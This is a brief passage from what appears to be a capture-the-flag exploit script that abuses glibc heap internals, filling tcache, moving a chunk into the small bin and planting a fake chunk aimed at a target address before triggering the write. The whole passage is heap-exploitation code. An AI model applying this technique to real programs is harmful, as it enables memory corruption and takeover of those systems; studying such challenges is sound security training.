...
fd = 2
# pop 1 to make tcache 6
malloc(0x78, p64(fd) + p64(target - 0x10))  # trampline
# small bin traverse unsorted bin -> no match -> 0x90 to small bin
create(0x88, 'M30W')

trampline = heap_addr+0x6b0
edit(0, trampline)
# trigger
create(0x78, 'M30W')
